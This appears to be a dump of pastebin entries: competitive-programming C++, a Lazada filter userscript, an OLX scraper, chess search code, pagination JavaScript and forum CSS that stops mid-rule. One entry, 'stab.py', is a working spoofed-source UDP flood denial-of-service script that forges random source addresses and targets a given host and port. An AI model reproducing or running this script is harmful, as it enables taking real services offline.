    		if (i <= n - k) {
    			ans = max(ans, res - sum);
    		}
    		q.push(c[i].second);
    		sum += c[i].second;
    		if (q.size() > k) {
    			sum -= q.top();
    			q.pop();
    		}
    		
    		res -= max(0ll, c[i].first - c[i].second);
    	}
    	
    	cout << ans << ""\n"";
    }
}"
GDH55cSL,B,Ankit_132,C++,Monday 29th of April 2024 01:36:23 PM CDT,"#include <bits/stdc++.h>
using namespace std;

int main(){
    int tst;
    cin>>tst;
    
    while(tst--){
        string s;
        cin>>s;
        
        long long int ans = 0;
        int cnt = 0;
        
        for(int i=0; i<s.size(); i++){
            if(s[i] == '0')     ans += cnt + (cnt>0);
            else                cnt++;
        }
        
        cout<<ans<<""\n"";
    }
}"
6BQUCuBA,A,Ankit_132,C++,Monday 29th of April 2024 01:36:02 PM CDT,"#include <bits/stdc++.h>
using namespace std;

int main(){
    int tst;
    cin>>tst;
    
    while(tst--){
        int n;
        cin>>n;
        
        vector<int> p(n);
        for(auto &e: p)     cin>>e;
        
        int ans = 3;
        
        for(int i=0; i<n; i++){
            if(p[p[i]-1]==i+1)      ans = 2;
        }
        
        cout<<ans<<""\n"";
    }
}"
LJRs6D98,Browse (Novely),AhmadXploit,Dart,Monday 29th of April 2024 01:31:32 PM CDT,"{
  ""browsers"": [
    {
      ""imgUrl"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1711700451/MoodPlay/Alan%20Walker/Photos/images_2_xy3r9y.jpg"",
      ""logoUrl"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1711700451/MoodPlay/Alan%20Walker/Photos/images_1_dvvxtk.jpg"",
      ""name"": ""Alan Walker"",
      ""instagram"": ""@edsheeran"",
      ""detailPage"": [
        {
          ""nameAccount"": ""Cerita cinta"",
          ""tags"": ""#hinata"",
          ""thumbnail"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1711700451/MoodPlay/Alan%20Walker/Photos/images_2_xy3r9y.jpg"",
          ""titleSong"": ""Alan Walker"",
		  ""detailPage"": [
			{
			  ""chapter"": ""Chapter 1"",
			  ""rating"": ""4.5"",
			  ""story"": ""Pada zaman dahulu kala, ada seorang anak""
			},
			{
			  ""chapter"": ""Chapter 2"",
			  ""rating"": ""4.2"",
			  ""story"": ""Pada hari minggu ku turut ayah ke kota""
			}
		  ]
        },
 {
          ""nameAccount"": ""Cerita cinta"",
          ""tags"": ""#hinata"",
          ""thumbnail"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1711700451/MoodPlay/Alan%20Walker/Photos/images_2_xy3r9y.jpg"",
          ""titleSong"": ""Alan Walker"",
		  ""detailPage"": [
			{
			  ""chapter"": ""Chapter 1"",
			  ""rating"": ""4.5"",
			  ""story"": ""Pada zaman dahulu kala, ada seorang anak""
			},
			{
			  ""chapter"": ""Chapter 2"",
			  ""rating"": ""4.2"",
			  ""story"": ""Pada hari minggu ku turut ayah ke kota""
			}
		  ]
        }
      ]
    },
    {
      ""imgUrl"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1711700451/MoodPlay/Alan%20Walker/Photos/images_2_xy3r9y.jpg"",
      ""logoUrl"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1711700451/MoodPlay/Alan%20Walker/Photos/images_1_dvvxtk.jpg"",
      ""name"": ""SZA"",
      ""instagram"": ""@edsheeran"",
      ""detailPage"": [
        {
          ""nameAccount"": ""Cerita cinta"",
          ""tags"": ""#naruto"",
          ""thumbnail"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1711700451/MoodPlay/Alan%20Walker/Photos/images_2_xy3r9y.jpg"",
          ""titleSong"": ""Alan Walker"",
		  ""detailPage"": [
			{
			  ""chapter"": ""Chapter 1"",
			  ""rating"": ""4.5"",
			  ""story"": ""Pada zaman dahulu kala, ada seorang anak""
			},
			{
			  ""chapter"": ""Chapter 2"",
			  ""rating"": ""4.2"",
			  ""story"": ""Pada hari minggu ku turut ayah ke kota""
			}
		  ]
        }
      ]
    }
  ]
}"
1v67J439,lazada.vn-add-search-result-filters.user.js,jcunews,JavaScript,Monday 29th of April 2024 01:20:09 PM CDT,"// ==UserScript==
// @name         lazada.vn add search result filters
// @namespace    https://greasyfork.org/en/users/85671-jcunews
// @version      0.0.1
// @license      AGPL v3
// @author       jcunews
// @description  Context: https://www.reddit.com/r/userscripts/comments/1c67l08/request_search_filter_for_lazadavn/
// @match        https://www.lazada.vn/*
// @grant        none
// ==/UserScript==

((tm, xs) => {
  xs = /(\d+(?:\.\d+)?)(.)? sold/;
  function filter(vms, vxw) {
    vms = parseInt(ms.value.trim());
    vxw = (vxw = xw.value.trim()) && vxw.toLowerCase().replace(/\s+/g, "" "").split("" "");
    document.querySelectorAll('div[data-item-id]').forEach((item, el, m, s, w) => {
      if (!isNaN(vms)) {
        if ((el = item.querySelector(':scope>div>div>div>div>span>span:first-child')) && (m = el.textContent.match(xs))) {
          switch (m[2]) {
            case ""M"": s = parseFloat(m[1]) * 1000000; break;
            case ""K"": s = parseFloat(m[1]) * 1000; break;
            default : s = parseFloat(m[1])
          }
          s = s >= vms
        }
      } else s = true;
      if (vxw) {
        if (el = item.querySelector(':scope>div>div>div>div>a:not(:has(*))')) {
          el = el.textContent.toLowerCase();
          w = vxw.every(w => !el.includes(w))
        }
      } else w = true;
      item.style.display = s && w ? """" : ""none""
    })
  }
  function process(a) {
    if (!window.flt && window.q) {
      q.parentNode.style.display = ""flex"";
      q.style.position = ""static"";
      q.parentNode.insertAdjacentHTML(""beforeend"", `<style>
  #ms,#xw { border:2px solid #ccc; padding:0 .3em; width:5.2em; font-size:11pt }
  #xw { width:7.5em }
  #flt { display:flex; margin-right:45px; border:2px solid #ccc; cursor:pointer }
  #flt:hover { background:#ddd }
  #flt>div { margin:auto; width:1.8em }
  #flt>div>div { margin:2px auto; border-top:2px solid #555; width:1.2em }
  #flt>div>div:nth-child(2) { width:.8em }
  #flt>div>div:nth-child(3) { width:.4em }
</style><input id=ms placeholder=""Min. sold""><input id=xw placeholder=""Exclude words""><div id=flt><div><div></div><div></div><div></div></div></div>`);
      ms.oninput = () => ms.style.backgroundColor = !ms.value.trim() || /^\s*([-+]?\d+)\s*$/.test(ms.value) ? """" : ""#fdd"";
      ms.onblur = m => (m = ms.value.match(/^\s*([-+]?\d+)\s*$/)) && (ms.value = parseInt(m[1]));
      xw.onblur = () => xw.value = xw.value.trim();
      flt.onclick = () => {
        if (ms.style.backgroundColor) return alert(""Invalid integer number for sold items."");
        filter()
      }
    }
    if (window.flt) filter()
  }
  (new MutationObserver(() => {
    clearTimeout(tm);
    tm = setTimeout(process, 200)
  })).observe(document.body, {childList: true, subtree: true});
  process();
})()
"
765nLAkJ,stab.py,betrayed,Python,Monday 29th of April 2024 01:17:35 PM CDT,"#!/usr/bin/env python3

# Spoofed UDP Denial-of-Service script
# Tested on: Kali GNU/Linux Rolling 2024.1
#            Ubuntu server 22.04.3 LTS

import sys, time, threading, socket
import random, string, os
from scapy.all import *
from colorama import Fore
from urllib.parse import urlparse

_abort = False

def _udp(_ip, _min, _max):
    while _abort == False:
        try:
            _fraud = ""."".join(str(random.randint(0, 255)) for _ in range(4))
            payload = ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=random.randint(int(_min), int(_max))))
            pkt = IP(dst=_ip, src=_fraud) / UDP(sport=RandShort(), dport=int(sys.argv[2])) / payload.encode()
            send(pkt, verbose=False)
        except:
            pass

def _rslv():
    _host = sys.argv[1].lower()
    if not (_host.startswith('http://') or _host.startswith('https://')):
        _host = ""http://"" + _host

    try:
        _domain = urlparse(_host).netloc
        _ip = socket.gethostbyname(_domain)
        return _domain, _ip
    except KeyboardInterrupt:
        sys.exit('\r\n\033[1m\033[31m DNS resolution failed!\r\n')

def main():
    if len(sys.argv) != 6:
        sys.exit('\r\n\033[1m\033[37m Usage: <ip/url> <port> <byte range: x-y> <time> <threading>\r\n')
        
    if not '-' in sys.argv[3]:
        sys.exit('\r\n\033[1m\033[31m Error! Invalid byte range. Hyphen not detected!\r\n')
        
    if not os.geteuid() == 0:
        sys.exit('\r\n\033[7m\033[31m Script requires root elevation!\r\n')

    _domain, _ip = _rslv()
    global _abort
    
    try:
        _min, _max = sys.argv[3].split(""-"")
        if int(_min) > int(_max):
            _min = _max
    except:
        sys.exit('\r\n\033[1m\033[31m Invalid byte range!\r\n')

    os.system('clear')
    print('''\033[1m\033[37m ""  ""[    `M:_                                 .dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
            ""-[    ""                          .dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
                                             .dMMMMMMMMP""""""""""""""""""-\MMMMMMMMMMMMMMMMM
 b,_.dMMMMMMMb._                           .d<MMMMMMP""              ""\MMMMMMMMMMMMMM
 MMMMMMMMMMMMMMM[                         .dMMMMMMMM""   ,=            ""MMMMMMMMMMMMM
 MMMMMMMMMMMMMMMMIb.__                   OMMMMMMMMM   ,:""              `XMMMMMMMMMMM
 MMMMMMMMMMMMMMMMMMMMMM:                dMMMMMMMMP"" _,;   __             ""MMMMMMMMMM
 MMMMMMMMMMMMMMMMMMMMMP""               dMMMMMMMMM""_:MP""_dMMMP  , __        `MMMMMMMM
 MMMMMMMMMMMMMMMMMMP""                .dMMMMMMP""_.dMMMMMMMMM""   [_dMMb.     "" ]MMMMMM
 MMMMMMMMMMMMMMMMMM                  UMMMMMP""_dMMMMMMMMMMMP     .dMMMM,     .dMMMMMM
 MMMMMMMMMMMMMMMMMP                 dMMMMMM   ;MMMMMMMMMMP""     :MMMMMb,    `TMMMMMM
 MMMMMMMMMMMMMMMMM""               _dMMMMMMK   `qMMMMXP""""_.;      !MMMMMMb.   \MMMMMM
 MMMMMMMMMMMMMMMM[               :MMMMMMMM\         _.;P""""       \MMMMMMM!,   QMMMMM
 MMMMMMMMMMMMMMMMM;             ,:MMMMMMMMb._  _.=""""""  _.o88o_    ""QMMMMMMb.  ""QMMMM
 MMMMMMMMMMMMMMMMMP             ]MMMMMMMMMMMMMMP     .dXMMMMMMb_    `""QMMMM/    `MMM
 MMMMMMMMMMMMMMMMP""             :MMMMMMMMMMMMMX,            `""IP              _.dMMM
 MMMMMMMMMMMMMMMb=_             ]MMMMMMMMMMMMV  .                  `;._     _dMMMMMM
  `""M.       VMP""                MMMMMMMMMMMMB_.`_ .dMMbo._          ``""""xdMMMMMMMMM
     |        ||.                QMMMMMMMMMMMMM / .OMMMMMMMMD.          _.dMMMMMMMMM
     !        !|               _dMMMMMMMMMMMMMM  .dMMMMMMMMMMM;       .dMMMMMMMMMMMM
     |      |  |               dMMMMMMMMMMMMMMP .MMMMMMMMMMMMM;       dMMMMMMMMMMMMM
 ____|      |  |           _.odMMMMMMMMMMMMMMMM SMMMMMMMMMMMMP     ,odMMMMMMMMMMMMMM
 MMMMM      |  |,db.____.odMMMMMMMMMMMMMMMMMMMP `XMMMMMMMMMMP'   ,odMMMMMMMMMMMMMMMM
 MMMMM      |   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM; dMMMMMMMMMMP`  ,odMMMMMMMMMMMMMMMMMM
 MMMMM      |   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMK dMMMMMMMMP""""_,odMMMMMMMMMMMMMMMMMMMMM
 MMMMM      |   MMMMMMMMMMMMMMMMMMMMMMMMMMMMP :MMMMMMMM"" ,odMMMMMMMMMMMMMMMMMMMMMMMM
 MMMMM!         MMMMMMMMMMMMMMMMMMMMMMMMMMMM"" GMMMMMMMP .odMMMMMMMMMMMMMMMMMMMMMMMMM
 MMMMM!         MMMMMMMMMMMMMMMMMMMMMMMMMMMMb MMMMMMMP odMMMMMMMMMMMMMMMMMMMMMMMMMMM
 MMMMM!         MMMMMMMMMMMMMMMMMMMMMMMMMMMM; QMMMMM"" dMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
 MMMMMb         MMMMMMMMMMMMMMMMMMMMMMMMMMMMb `QMMP dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
 MMMMMMb        MMMMMMMMMMMMMMMMMMMMMMMMMMMMbo_,__odMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
 MMMMMMM\       MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
 MMMMMMMMb._    Q|MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
 Coded by Petrolization                                      Disrespect = Disconnect    
''')
    print('\033[31m Getting rid of ' + _ip + "":"" + sys.argv[2] + ' for ' + sys.argv[4] + ' seconds...\r\n')

    tasks = []
    for x in range(0, int(sys.argv[5])):
        x = threading.Thread(target=_udp, args=(_ip, _min, _max))
        tasks.append(x)
        x.start()
        
    _quit = time.time() + int(sys.argv[4])
    try:
        while time.time() <= _quit:
            pass
    except KeyboardInterrupt:
        pass
    
    _abort = True
    
    for y in tasks:
        y.join()
        
    sys.exit('\r\n\033[37m Done!\r\n')

if __name__ == '__main__':
    main()"
VQQkDDpR,Untitled,rcod3r,Python,Monday 29th of April 2024 12:48:42 PM CDT,"import scrapy
import json

class OlxHouses(scrapy.Spider):
    name = 'olx'

    custom_settings = {
        'USER_AGENT' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'AUTOTHROTTLE_ENABLED': True,
    }

    def start_requests(self):
        for page in range(1,101):
            yield scrapy.Request(f'https://www.olx.com.br/eletronicos-e-celulares/estado-sp?o={page}')

    def parse(self, response, **kwargs):
        html = json.loads(response.xpath('//script[@id=""__NEXT_DATA__""]/text()').get())
        houses = html.get('props').get('pageProps').get('ads')
        for house in houses:
            yield{
                'title' : house.get('title'),
                'price' : house.get('price'),
                'locations' : house.get('location')
            }


"
x8CZ5FwS,very good output christ,max2201111,Python,Monday 29th of April 2024 12:45:54 PM CDT,"From 8/5k2/8/8/8/8/8/1KQ5 w - - to 8/5k2/8/8/8/8/8/1KQ5 w - -: 0 moves
From 8/5k2/8/8/8/8/8/1KQ5 w - - to 2Q5/5k2/8/8/8/8/8/1K6 b - -: 1 moves
From 8/5k2/8/8/8/8/8/1KQ5 w - - to 8/2Q2k2/8/8/8/8/8/1K6 b - -: 1 moves
From 8/5k2/8/8/8/8/8/1KQ5 w - - to 8/5k2/7Q/8/8/8/8/1K6 b - -: 1 moves
From 8/5k2/8/8/8/8/8/1KQ5 w - - to 8/5k2/2Q5/8/8/8/8/1K6 b - -: 1 moves
From 8/5k2/8/8/8/8/8/1KQ5 w - - to 8/5k2/8/6Q1/8/8/8/1K6 b - -: 1 moves
From 8/5k2/8/8/8/8/8/1KQ5 w - - to 8/5k2/8/2Q5/8/8/8/1K6 b - -: 1 moves
From 8/5k2/8/8/8/8/8/1KQ5 w - - to 8/5k2/8/8/5Q2/8/8/1K6 b - -: 1 moves
From 8/5k2/8/8/8/8/8/1KQ5 w - - to 8/5k2/8/8/2Q5/8/8/1K6 b - -: 1 moves
From 8/5k2/8/8/8/8/8/1KQ5 w - - to 8/5k2/8/8/8/4Q3/8/1K6 b - -: 1 moves
From 8/5k2/8/8/8/8/8/1KQ5 w - - to 8/5k2/8/8/8/2Q5/8/1K6 b - -: 1 moves
From 8/5k2/8/8/8/8/8/1KQ5 w - - to 8/5k2/8/8/8/Q7/8/1K6 b - -: 1 moves
From 8/5k2/8/8/8/8/8/1KQ5 w - - to 8/5k2/8/8/8/8/3Q4/1K6 b - -: 1 moves
From 8/5k2/8/8/8/8/8/1KQ5 w - - to 8/5k2/8/8/8/8/2Q5/1K6 b - -: 1 moves
From 8/5k2/8/8/8/8/8/1KQ5 w - - to 8/5k2/8/8/8/8/1Q6/1K6 b - -: 1 moves
From 8/5k2/8/8/8/8/8/1KQ5 w - - to 8/5k2/8/8/8/8/8/1K5Q b - -: 1 moves
From 8/5k2/8/8/8/8/8/1KQ5 w - - to 8/5k2/8/8/8/8/8/1K4Q1 b - -: 1 moves
From 8/5k2/8/8/8/8/8/1KQ5 w - - to 8/5k2/8/8/8/8/8/1K3Q2 b - -: 1 moves
From 8/5k2/8/8/8/8/8/1KQ5 w - - to 8/5k2/8/8/8/8/8/1K2Q3 b - -: 1 moves
From 8/5k2/8/8/8/8/8/1KQ5 w - - to 8/5k2/8/8/8/8/8/1K1Q4 b - -: 1 moves
From 8/5k2/8/8/8/8/8/1KQ5 w - - to 8/5k2/8/8/8/8/2K5/2Q5 b - -: 1 moves
From 8/5k2/8/8/8/8/8/1KQ5 w - - to 8/5k2/8/8/8/8/1K6/2Q5 b - -: 1 moves
From 8/5k2/8/8/8/8/8/1KQ5 w - - to 8/5k2/8/8/8/8/K7/2Q5 b - -: 1 moves
From 8/5k2/8/8/8/8/8/1KQ5 w - - to 8/5k2/8/8/8/8/8/K1Q5 b - -: 1 moves
Best move for white: c1c8
Od 8/5k2/8/8/8/8/8/1KQ5 w - - do 8/8/5k2/8/8/4Q3/8/1K6 w - -: 2 moves"
FKugyrXW,very good fen1 to fen2 number of moves d6e6 Christopher,max2201111,Python,Monday 29th of April 2024 12:45:14 PM CDT,"import chess
from collections import deque, defaultdict

def simplify_fen(fen):
    parts = fen.split(' ')
    return ' '.join(parts[:4])  # Normalize FEN string

def generate_moves_and_distances(board):
    initial_fen = simplify_fen(board.fen())
    queue = deque([(initial_fen, 0)])
    distances = defaultdict(lambda: defaultdict(lambda: float('inf')))
    visited = set()

    while queue:
        current_fen, current_depth = queue.popleft()
        
        if current_fen in visited:
            continue
        visited.add(current_fen)
        distances[initial_fen][current_fen] = current_depth

        current_board = chess.Board(current_fen)
        for move in current_board.legal_moves:
            current_board.push(move)
            next_fen = simplify_fen(current_board.fen())
            if next_fen not in visited or distances[initial_fen][next_fen] > current_depth + 1:
                distances[initial_fen][next_fen] = current_depth + 1
                queue.append((next_fen, current_depth + 1))
            current_board.pop()

    return distances

def minimax(board, depth, maximizing_player):
    if depth == 0 or board.is_game_over():
        evaluation = evaluate_board(board)
        if evaluation is None:
            return 0  # Neutr√°ln√≠ hodnota pro nedeterminovan√© pozice
        return evaluation

    if maximizing_player:
        max_eval = float('-inf')
        for move in board.legal_moves:
            board.push(move)
            eval = minimax(board, depth - 1, not maximizing_player)
            board.pop()
            if eval is not None:
                max_eval = max(max_eval, eval)
            else:
                max_eval = max(max_eval, 0)  # Neutr√°ln√≠ hodnota pokud eval je None
        return max_eval
    else:
        min_eval = float('inf')
        for move in board.legal_moves:
            board.push(move)
            eval = minimax(board, depth - 1, not maximizing_player)
            board.pop()
            if eval is not None:
                min_eval = min(min_eval, eval)
            else:
                min_eval = min(min_eval, 0)  # Neutr√°ln√≠ hodnota pokud eval je None
        return min_eval

def find_best_move(board, depth):
    best_move = None
    best_value = float('-inf')

    for move in board.legal_moves:
        board.push(move)
        value = minimax(board, depth - 1, False)
        board.pop()
        if value > best_value:
            best_value = value
            best_move = move

    return best_move

 


def evaluate_board(board):
    if board.is_checkmate():
        if board.turn:  # Black's turn, white gave checkmate
            return float('-inf')
        else:
            return float('inf')
    if board.is_stalemate() or board.is_insufficient_material():
        return 0
    return None  # No evaluation, return a neutral score

 

# Main usage
initial_fen = ""5k2/8/3K4/6Q1/8/8/8/8 w - - 0 1""

initial_fen = ""8/8/4k3/8/2K5/5Q2/8/8 w - - 0 1""

initial_fen = ""8/5k2/8/8/8/8/8/1KQ5 w - - 0 1""


initial_fen = simplify_fen(initial_fen)

board = chess.Board(initial_fen)
AB = generate_moves_and_distances(board)

def print_distances_less_than_two(AB, initial_fen):
    for fen2 in AB[initial_fen]:
        if AB[initial_fen][fen2] < 2:
            print(f""From {initial_fen} to {fen2}: {AB[initial_fen][fen2]} moves"")

print_distances_less_than_two(AB, initial_fen)

# Finding best move using minimax
best_move = find_best_move(board, 8)
print(""Best move for white:"", best_move)

fen3 = ""8/5k2/8/8/8/8/8/1KQ5 w - -""
fen4 = ""8/8/5k2/8/8/4Q3/8/1K6 w - -""

print(f""Od {fen3} do {fen4}: {AB[fen3][fen4]} moves"")"
86VdbG16,pagination-need,Grossos,JavaScript,Monday 29th of April 2024 12:30:32 PM CDT,"// debugger
const pageNumbers = (total, max, current) => {
    const half = Math.round(max / 2);
    let to = max;

    if (current + half >= total) {
        to = total;
    } else if (current > half) {
        to = current + half
    }

    let from = to - max;

    return Array.from({ length: max }, (_, i) => (i + 1) + from);
};

function PaginationButtons(totalPages, maxPageVisible = 10, currentPage = 1) {
    let pages = pageNumbers(totalPages, maxPageVisible, currentPage);
    let currentPageBtn = null;
    const buttons = new Map();
    const fragment = document.createDocumentFragment();
    const paginationButtonsContainer = document.createElement('div');
    paginationButtonsContainer.className = 'pagination-buttons';

    const disabled = {
        start: () => pages[0] === 1,
        prev: () => currentPage === 1,
        end: () => pages.slice(-1)[0] === totalPages,
        next: () => currentPage === totalPages,
    }

    const createAndSetupButton = (label = '', cls = '', disabled = false, handleClick = () => { }) => {
        const button = document.createElement('button');
        button.textContent = label;
        button.className = `page-btn ${cls}`;
        button.disabled = disabled;
        button.addEventListener('click', event => {
            handleClick(event);
            this.update();
            paginationButtonsContainer.value = currentPage;
            paginationButtonsContainer.dispatchEvent(new Event('change'));
        })

        return button;
    }

    const onPageButtonClick = e => currentPage = Number(e.currentTarget.textContent);

    const onPageButtonUpdate = index => btn => {
        btn.textContent = pages[index];

        if (pages[index] === currentPage) {
            currentPageBtn.classList.remove('active');
            btn.classList.add('active');
            currentPageBtn = btn;
            currentPageBtn.focus();
        }
    }

    buttons.set(
        createAndSetupButton('start', 'start-page', disabled.start(), () => currentPage = 1),
        (btn) => btn.disabled = disabled.start()
    )

    buttons.set(
        createAndSetupButton('prev', 'prev-page', disabled.prev(), () => currentPage -= 1),
        (btn) => btn.disabled = disabled.prev()
    )

    pages.forEach((pageNumber, index) => {
        const isCurrentPage = pageNumber === currentPage;
        const button = createAndSetupButton(pageNumber, isCurrentPage ? 'active' : '', false, onPageButtonClick);

        if (isCurrentPage) {
            currentPageBtn = button;
        }

        buttons.set(button, onPageButtonUpdate(index))
    })

    buttons.set(
        createAndSetupButton('next', 'next-page', disabled.next(), () => currentPage += 1),
        (btn) => btn.disabled = disabled.next()
    )

    buttons.set(
        createAndSetupButton('end', 'end-page', disabled.end(), () => currentPage = totalPages),
        (btn) => btn.disabled = disabled.end()
    )

    buttons.forEach((_, btn) => fragment.appendChild(btn));

    this.render = (container = document.body) => {
        paginationButtonsContainer.appendChild(fragment);
        container.appendChild(paginationButtonsContainer);
    }

    this.update = (newPageNumber = currentPage) => {
        currentPage = newPageNumber;
        console.log('currentPage', currentPage);
        pages = pageNumbers(totalPages, maxPageVisible, currentPage);
        buttons.forEach((updateButton, button) => updateButton(button));
    }

    this.onChange = (handler) => {
        paginationButtonsContainer.addEventListener('change', handler)
    }
};

const paginationButtons = new PaginationButtons(100);

paginationButtons.render();
paginationButtons.update(12);
// console.log(pageNumbers(1000, 10, 6));
paginationButtons.onChange(e => {
    console.log('onChange', e.target.value);
})"
ELw0BaVF,pagination-web,Grossos,JavaScript,Monday 29th of April 2024 12:29:35 PM CDT,"async function fetchData() {
    try {
        const response = await fetch('http://localhost:5000/data');
        if (!response.ok) {
            console.log(err.message || err);
        }
        const data = await response.json();

        generatePagination(data.length, 50);

    } catch (err) {
        console.log(err.message || err);
    }
}

fetchData();

function generatePagination(totalItems, itemsPerPage) {
    const paginationContainer = document.querySelector('.container-page');
    const currentPage = getCurrentPage();
    const totalPages = Math.ceil(totalItems / itemsPerPage);

    for (let i = 0; i < totalPages; i++) {
        const startRange = i * itemsPerPage + 1;
        const endRange = Math.min((i + 1) * itemsPerPage);

        const pipe = document.createElement('b');
        pipe.textContent = ' | ';
        pipe.style.fontSize = '25px';

        const link = document.createElement('a');
        link.className = 'pages';
        link.style.textDecoration = 'none';
        link.style.fontSize = '25px';
        link.href = `http://localhost:5000/?page=${i + 1}&from=${startRange}&to=${(i + 1) * itemsPerPage}`;
        link.textContent = `${startRange}-${endRange}`;
        if (i + 1 === currentPage) {
            link.style.fontWeight = 'bold';
            // link.style.fontColor = 'ligtblue';
        }
        paginationContainer.appendChild(pipe);
        paginationContainer.appendChild(link);
        paginationContainer.appendChild(pipe);
    }
}

function getCurrentPage() {
    const urlParams = new URLSearchParams(window.location.search);
    const currentPage = parseInt(urlParams.get('page')) || 1;
    return currentPage;
}
"
2t7Rzf13,M-Dark v1,BaapJaan,CSS,Monday 29th of April 2024 12:14:13 PM CDT,"<xf:include template=""xf_prefix.less"" />
/************************ Dark only ***********************/
.XenTR .xentr-menu-body .is-selected .p-navEl-icon {
	color: #FFF;
}
.button.button--cta, a.button.button--cta{
	border-color: #009688;
	background: #009688;
}

.button.is-disabled, a.button.is-disabled {
    background: #ffffff !important;
}
a.button--cta.button.button--icon.button--icon--write:hover {
    background: #0f3651;
}
.block-header .normal--threads i {
	color: #000000;
}
.pairs--customField a {
    color: #009688;
}
.up-notice {
    background: #23252f !important;
}
.donate-now img {
    filter: invert(1);
}
/* END */
.menu-footer-main ul li a {
    padding: 3px 8px;
    background: #009688;
    color: white;
    border-radius: 3px;
}
.notices--floating .notice.notice--primary {
  background-color: #0f3652;
  color: white;
}

[data-template=""forum_list""]{
	.breadcrumb-content{
		display: none;
	}
	.donate-now {
		display: none;
	}
}
.fr-wrapper a{color: #009688;}
a{
	
	text-decoration: none !important;
}
[data-nav-id=""110""] {
    background: #002640 !important;
    border-radius: 8px 0px 0px 8px;
}
[data-template=""thread_view""]{
	&[data-container-key=""node-12""], &[data-container-key=""node-13""]{
	.mkrtl{
		direction: rtl;
		text-align: right;
		unicode-bidi: isolate;
		font-family: ""Noto Kufi Arabic"", sans-serif;
		font-optical-sizing: auto;
		line-height: 1.7;
	}
	.mkltr {
		direction: ltr;
		text-align: left;
		unicode-bidi: isolate;
		font-family: ""Noto Kufi Arabic"", sans-serif;
		font-optical-sizing: auto;
		line-height: 1.7;
	}
	.mkrtl li {
		text-align: right;
		unicode-bidi: isolate;
		font-family: ""Noto Kufi Arabic"", sans-serif;
		font-optical-sizing: auto;
		line-height: 1.7;
	}
	.mkltr li {
		text-align: left;
		unicode-bidi: isolate;
		font-family: ""Noto Kufi Arabic"", sans-serif;
		font-optical-sizing: auto;
		line-height: 1.7;
	}
	.mkrtl li div {
		text-align: right!important;
		font-family: ""Noto Kufi Arabic"", sans-serif;
		font-optical-sizing: auto;
		line-height: 1.7;
	}
	.mkltr li div {
		text-align: left!important;
		font-family: ""Noto Kufi Arabic"", sans-serif;
		font-optical-sizing: auto;
		line-height: 1.7;
	}
	.mkrtl .bbCodeBlock-content div{
		text-align: right!important;
		direction: rtl;	
		unicode-bidi: bidi-override;
		font-family: ""Noto Kufi Arabic"", sans-serif;
		font-optical-sizing: auto;
		line-height: 1.7;
	}
	.mkltr .bbCodeBlock-content div{
		text-align: left!important;
		direction: ltr;
		text-align: left;
		unicode-bidi: bidi-override;
		font-family: ""Noto Kufi Arabic"", sans-serif;
		font-optical-sizing: auto;
		line-height: 1.7;
	}
	.p-body-header{
			text-align: right!important;
			direction: rtl;	
			unicode-bidi: bidi-override;
			font-family: ""Noto Kufi Arabic"", sans-serif;
			font-optical-sizing: auto;
		}
	.p-title-value {
		margin-right: 10px;
	}	
}
}
[data-template=""forum_view""]{
	&[data-container-key=""node-12""], &[data-container-key=""node-13""]{
		.structItem{
			direction: rtl;
		}
}
}
[data-container-key=""node-12""], [data-container-key=""node-13""]{
	.structItem-title{
		font-size: 14px !important;
		font-family: ""Noto Kufi Arabic"", sans-serif;
		font-optical-sizing: auto;
	}
}
.block--category8, .block--category9{
    font-family: ""Noto Kufi Arabic"", sans-serif;
  	font-optical-sizing: auto;
}
/* XenVn */
.verified {
    font-size: 80%;
    margin-left: 2px;
    color: #07B8FF !important;
    display: inline;
    font-weight: 900;
}

.userBanner.userBanner--reputation{
	background: #F2920C;
}
#mSnackbarContainer .mSnackbar{
	background: #23252F !important;
	color: #FFF;
}
#mSnackbarContainer .mSnackbar a {
    color: #02B19F !important;
}
/*ENDS*/
/* Icons on Notable members page */
[data-template=""member_notable""] .p-body-sideNavContent a.blockLink,
&[data-template=""member_notable""] h3.block-textHeader a {
    &:before {
        .m-faBase();
        padding-right: 5px;
    }
    &[href*=""members/""]:before {
        .m-faContent(@fa-var-ellipsis-h-alt);
    }
    &[href*=""key=most_messages""]:before {
        .m-faContent(@fa-var-comments);
    }
    &[href*=""key=highest_reaction_score""]:before {
        .m-faContent(@fa-var-thumbs-up);
    }
    &[href*=""key=most_points""]:before {
        .m-faContent(@fa-var-dot-circle);
    }
    &[href*=""key=xfrm_most_resources""]:before {
        .m-faContent(@fa-var-cog);
    }
    &[href*=""key=xfmg_most_media_items""]:before {
        .m-faContent(@fa-var-images);
    }
    &[href*=""key=xfmg_most_albums""]:before {
        .m-faContent(@fa-var-image);
    }
    &[href*=""key=todays_birthdays""]:before {
        .m-faContent(@fa-var-gift);
    }
    &[href*=""key=staff_members""]:before {
        .m-faContent(@fa-var-user-tie);
    }
}
.p-header{
	background:#0F3652 !important
}
.userBanner.userBanner--reputation{
	display: inline-table !important;
}
.node-icon {
    display: table-cell;
    vertical-align: middle;
    text-align: center;
    width: 45px;
    padding: 10px 0 10px 0px;
}
.fa-comments:before {
    content: ""\f4b6"";
}
.node-icon i {
    display: block;
    font-size: 24px;
    background: linear-gradient(180deg, #1c5e8b, #0f3652);
    width: 40px;
    height: 40px;
    line-height: 40px;
    border-radius: 10%;
    margin-right: 20px;
}
.node-title a:hover {
    color: #009688 !important;
}
.node-body {
    border-radius: 4px;
    background: #22242e !important;
    padding: 10px;
    margin-top: 10px !important;
